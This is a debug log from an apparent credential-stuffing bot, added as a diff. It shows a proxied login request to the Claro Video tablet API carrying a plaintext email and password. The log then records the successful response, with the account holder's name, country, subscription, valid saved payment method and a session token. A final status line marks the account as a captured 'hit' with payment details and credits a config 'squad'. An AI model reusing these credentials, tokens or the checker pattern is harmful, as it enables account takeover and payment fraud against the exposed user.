@@ -1,0 +1,45 @@
+-----------------------------------------
+Site: https://mfwktabletandroid-api.clarovideo.net/services/user/login?device_type=SM-G930F&device_id=13913755&api_version=v5.82&device_category=tablet&device_manufacturer=samsung&device_so=Android%205.1.1&region=mexico&authpt=12e4i8l6a581a&device_model=android&HKS=bts234uivrn373h8gk96r3sa37&authpn=amco&format=json&includpaywayprofile=1
+Debug of BOT 96
+Socks: 103.216.82.198
+-----------------------------------------
+<-----Received Source----->
+Fake Socket Stage
+
+<-----Bot Status: Variables computed successfully -> Posting----->
+<-----Sent Headers----->
+POST /services/user/login?device_type=SM-G930F&device_id=13913755&api_version=v5.82&device_category=tablet&device_manufacturer=samsung&device_so=Android%205.1.1&region=mexico&authpt=12e4i8l6a581a&device_model=android&HKS=bts234uivrn373h8gk96r3sa37&authpn=amco&format=json&includpaywayprofile=1 HTTP/1.1
+Accept: */*
+User-Agent: AndroidDlaApk AndroidDlaApkAccedo
+Host: mfwktabletandroid-api.clarovideo.net
+Pragma: no-cache
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 50
+Cookie: PHPSESSID=bts234uivrn373h8gk96r3sa37; Max-Age=5184000
+x-newrelic-id: UgECVVNRGwUDVFFbDgQ=
+Post Data:
+username=leonardofpaz@hotmail.com&password=5536002
+
+<-----Received Headers----->
+HTTP/1.1 200 OK
+Server: nginx/1.6.2
+Content-Type: text/json; charset=utf-8
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE
+Access-Control-Allow-Headers: Authorization
+Access-Control-Allow-Origin: *
+X-NewRelic-App-Data: PxQBVlNXDQETV1VaAwgEV1UTGhE1AwE2QgNWEVlbQFtcC2VOchRAFgtba04VBkpFWQcEEWseQhUBQ2ocDgkEC15AFFIWCAQCA1UVUR9VBlJVAxtMV08aAwVdUVoHB1JfVwcCBlpVV0AcBFkOS11p
+X-server-addr: 10.20.8.146
+Expires: Tue, 11 Sep 2018 17:38:37 GMT
+Cache-Control: max-age=0, no-cache, no-store
+Pragma: no-cache
+Date: Tue, 11 Sep 2018 17:38:37 GMT
+Content-Length: 2325
+Connection: keep-alive
+Set-Cookie: PHPSESSID=bts234uivrn373h8gk96r3sa37; expires=Sat, 10-Nov-2018 17:38:36 GMT; Max-Age=5184000; path=/
+Akamai-Host: mfwktabletandroid-api.clarovideo.net
+
+<-----Received Source----->
+{"entry":{"device_type":"SM-G930F","device_id":"13913755","api_version":"v5.82","device_category":"tablet","device_manufacturer":"samsung","device_so":"Android 5.1.1","region":"mexico","authpt":"12e4i8l6a581a","device_model":"android","HKS":"bts234uivrn373h8gk96r3sa37","authpn":"amco","format":"json","includpaywayprofile":"1","username":"leonardofpaz@hotmail.com","password":"5536002","cache":"all"},"response":{"user_id":"31112742","username":"leonardofpaz@hotmail.com","email":"leonardofpaz@hotmail.com","firstname":"Leonardo","lastname":"Paz","country_code":"CO","region":"colombia","session_servername":"10.20.8.146","session_stringvalue":"(bts234uivrn373h8gk96r3sa37)","session_parametername":"HKS","session_userhash":"MzExMTI3NDJ8MTUzNjY4NzUxNnxlMGUzM2ZhNjU0MjQzODQwMTdlZjEyMGFiMWRhMDUyNmY0MTcwMDRmOTM0YmMzMWU3ZA==","language":"ES","status":"success","newWorkflow":1,"lasttouch":{"seen":"5b97fd9cc52aa","favorited":"5b97fd9cc5b21","purchased":"5b97fd9cc810e"},"accepted_terms":1,"superhighlight":["susc ","no_suscripto_fox","no_suscripto_hbo","no_suscripto_crackle","no_suscripto_noggin"],"subscriptions":{"AMCO":true},"paymentMethods":{"clarocolombiagate":true},"hasSavedPayway":1,"hasUserSusc":1,"socialNetworks":[{"id_usuario":"31112742","id_usuario_social":"5af0ed4f923ee115f078fcf8","redsocial":"IMUSICA","extra_data":null}],"gamification_id":"5af0ed4f923ee115f078fcf8","paywayProfile":{"subscriptions":[{"name":"CV_MENSUAL","key":"Telmexmexico_Subscription_SVOD_30d","paymentmethod":{"gateway":"clarocolombiagate","gateway_text":"TEXT_PGS_PAYMENT_COLOMBIA_GATEWAY_CLAROCOLOMBIAGATE"}}],"paymentMethods":[{"gateway":"clarocolombiagate","gateway_text":"TEXT_PGS_PAYMENT_COLOMBIA_GATEWAY_CLAROCOLOMBIAGATE","status":"VALID","user_category":"VIP"}]},"counterValidEmail":9,"validEmail":true,"user_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1MzY2ODc1MTcsImV4cCI6MTU0MTg3MTUxNywidXNyIjp7InVzZXJfaWQiOiIzMTExMjc0MiIsInVzZXJuYW1lIjoibGVvbmFyZG9mcGF6QGhvdG1haWwuY29tIiwiZW1haWwiOiJsZW9uYXJkb2ZwYXpAaG90bWFpbC5jb20iLCJmaXJzdG5hbWUiOiJMZW9uYXJkbyIsImxhc3RuYW1lIjoiUGF6IiwiY291bnRyeV9jb2RlIjoiQ08iLCJyZWdpb24iOiJjb2xvbWJpYSIsImFjY2VwdGVkX3Rlcm1zIjoxLCJnYW1pZmljYXRpb25faWQiOiI1YWYwZWQ0ZjkyM2VlMTE1ZjA3OGZjZjgiLCJhY2NvdW50IjoiODMwMTA0NjIifX0.wSCX4csHdw5OAdgrIwfUbEW5n213wy5qyMi1mpJPWAg"},"status":"0","msg":"OK"}
+<-----Bot Status: Success Source Keyword Match -> Found Key ["user_token"] and Found Key ["hasSavedPayway":1] - Source Length: 2325 - Found data to capture: Pais: CO, Suscripciones: "AMCO":true, Tipo de suscripcion: MENSUAL, Estado del Pago: VALID Crada por JONATHAN GERONIMO +LORD CONFIG+ squad----->
